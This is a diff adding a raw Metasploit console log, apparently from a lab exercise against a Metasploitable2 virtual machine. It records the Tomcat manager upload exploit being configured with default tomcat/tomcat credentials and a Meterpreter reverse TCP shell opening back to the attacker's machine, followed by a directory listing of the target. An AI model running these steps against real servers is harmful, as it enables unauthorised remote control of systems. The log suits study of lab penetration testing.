@@ -1,0 +1,65 @@
+[1m[34m[*][0m Spooling to file msf_output.txt...
+[4mmsf6[0m [0m> use exploit/multi/http/tomcat_mgr_upload
+[0m[1m[34m[*][0m No payload configured, defaulting to java/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/http/tomcat_mgr_upload[0m) [0m> use exploit/multi/http/tomcat_mgr_upload[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Pspool msf_output.txt[Kexit[Kuse exploit/multi/http/tomcat_mgr_uploadexit -y[K[Kclear[Pexit -yuse exploit/multi/http/tomcat_mgr_uploadexit[Kspool msf_output.txtuse exploit/multi/http/tomcat_mgr_upload[Kuse exploit/multi/http/tomcat_mgr_upload[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kset RHOSTS <Metasploitable2_IP_Address>[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K192.168.56.102
+[0mRHOSTS => 192.168.56.102
+[4mmsf6[0m exploit([1m[31mmulti/http/tomcat_mgr_upload[0m) [0m> set RPORT 8180
+[0mRPORT => 8180
+[4mmsf6[0m exploit([1m[31mmulti/http/tomcat_mgr_upload[0m) [0m> set HttpUsername tomcat
+[0mHttpUsername => tomcat
+[4mmsf6[0m exploit([1m[31mmulti/http/tomcat_mgr_upload[0m) [0m> set HttpUsername tomcat[P tomcat[P tomcat[P tomcat[P tomcat[P tomcat[P tomcat[P tomcat[P tomcatP tomcata tomcats tomcats tomcatw tomcato tomcatr tomcatd tomcat
+[0mHttpPassword => tomcat
+[4mmsf6[0m exploit([1m[31mmulti/http/tomcat_mgr_upload[0m) [0m> set LHOST <Your_Kali_IP_Address>[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K192.168.56.3
+[0mLHOST => 192.168.56.3
+[4mmsf6[0m exploit([1m[31mmulti/http/tomcat_mgr_upload[0m) [0m> ip a
+[0m[1m[34m[*][0m exec: ip a
+
+[4mmsf6[0m exploit([1m[31mmulti/http/tomcat_mgr_upload[0m) [0m> exploit
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.3:4444 
+[1m[34m[*][0m Retrieving session ID and CSRF token...
+[1m[34m[*][0m Uploading and deploying GushkxP0ZfbnJYCh8rD2yTqMUg8...
+[1m[34m[*][0m Executing GushkxP0ZfbnJYCh8rD2yTqMUg8...
+[1m[34m[*][0m Undeploying GushkxP0ZfbnJYCh8rD2yTqMUg8 ...
+[1m[34m[*][0m Undeployed at /manager/html/undeploy
+[1m[34m[*][0m Sending stage (58073 bytes) to 192.168.56.102
+[0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.56.3:4444 -> 192.168.56.102:44751) at 2025-08-18 08:11:59 -0400
+
+[0m[4mmeterpreter[0m > ls
+[0mListing: /
+==========
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+040444/r--r--r--  4096     dir   2012-05-13 23:35:33 -0400  bin
+040444/r--r--r--  1024     dir   2012-05-13 23:36:28 -0400  boot
+040444/r--r--r--  4096     dir   2010-03-16 18:55:51 -0400  cdrom
+040444/r--r--r--  13480    dir   2025-08-18 13:34:48 -0400  dev
+040444/r--r--r--  4096     dir   2025-08-18 13:34:56 -0400  etc
+040444/r--r--r--  4096     dir   2010-04-16 02:16:02 -0400  home
+040444/r--r--r--  4096     dir   2010-03-16 18:57:40 -0400  initrd
+100444/r--r--r--  7929183  fil   2012-05-13 23:35:56 -0400  initrd.img
+040444/r--r--r--  4096     dir   2012-05-13 23:35:22 -0400  lib
+040000/---------  16384    dir   2010-03-16 18:55:15 -0400  lost+found
+040444/r--r--r--  4096     dir   2010-03-16 18:55:52 -0400  media
+040444/r--r--r--  4096     dir   2010-04-28 16:16:56 -0400  mnt
+100000/---------  7984     fil   2025-08-18 13:34:58 -0400  nohup.out
+040444/r--r--r--  4096     dir   2010-03-16 18:57:39 -0400  opt
+040444/r--r--r--  0        dir   2025-08-18 13:34:34 -0400  proc
+040444/r--r--r--  4096     dir   2025-08-18 13:34:58 -0400  root
+040444/r--r--r--  4096     dir   2012-05-13 21:54:53 -0400  sbin
+040444/r--r--r--  4096     dir   2010-03-16 18:57:38 -0400  srv
+040444/r--r--r--  0        dir   2025-08-18 13:34:42 -0400  sys
+040666/rw-rw-rw-  4096     dir   2025-08-18 13:37:31 -0400  tmp
+040444/r--r--r--  4096     dir   2010-04-28 00:06:37 -0400  usr
+040444/r--r--r--  4096     dir   2010-03-17 10:08:23 -0400  var
+100444/r--r--r--  1987288  fil   2008-04-10 12:55:41 -0400  vmlinuz
+
+[4mmeterpreter[0m > spool off
+[0m[1m[31m[-][0m Unknown command: spool. Run the [32mhelp[0m command for more details.
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down session: 1
+
+[1m[34m[*][0m 192.168.56.102 - Meterpreter session 1 closed.  Reason: Died
+[1m[34m[*][0m 192.168.56.102 - Meterpreter session 1 closed.  Reason: User exit
+[4mmsf6[0m exploit([1m[31mmulti/http/tomcat_mgr_upload[0m) [0m> spool off
+[0m
